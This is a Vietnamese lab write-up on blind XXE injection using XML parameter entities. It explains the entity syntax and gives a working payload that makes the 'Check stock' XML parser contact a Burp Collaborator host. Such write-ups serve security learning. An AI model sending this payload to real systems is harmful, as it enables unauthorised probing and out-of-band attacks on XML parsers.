Description: This lab has a “Check stock” feature that parses XML input, but does not display any unexpected values, and blocks requests containing regular external entities. To solve the lab, use a parameter entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator.

Như các lab ở trên thì lổ hổng vẫn sẽ nằm ở Check stock. Mục tiêu là truy cập đến server burp collaborator giống như lab thứ 3. Và lab này block external entity. 

![image](https://github.com/elliSzAt/XML-external-entity-XXE-injection/assets/125866921/b2b9f6d6-2754-43f0-a74c-8733744c68f6)

Lab này đã gợi ý là ta phải sử dụng XML Parameter Entities. Sau 1 hồi gu gồ thì có 1 số thông tin như sau:

  - XML Parameter Entities cũng giống như các thực thể thông thường, Ngoại trừ việc nó được sử dụng bên trong DTD và nằm giữa <!DOCTYPE docname [ và ]> và phải thêm 1 dấu % trước tên thực thể.
  - Trong parameter entity cũng có external và internal entity nhưng ở đây sẽ chỉ bàn về external entity. Trong parameter entity, external entity phải là một cú pháp hợp lệ của dữ liệu XML vì nó sẽ được coi là một DTD. Việc sử dụng parameter entity tương tự như khái niệm về hàm include() trong PHP.

Ví dụ:

```
<!ENTITY % author "<!ELEMENT author EMPTY">
%author;
```

Như vậy payload của ta sẽ được thực hiện như sau:

```
<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://lmb2bft3amiwsbod6bpzfhrab1hs5lta.oastify.com"> %xxe; ]>
```

![image](https://github.com/elliSzAt/XML-external-entity-XXE-injection/assets/125866921/ecab824e-efb8-47f4-8b6c-5c57148b7278)

Như vậy ta đã hoàn thành được lab4.
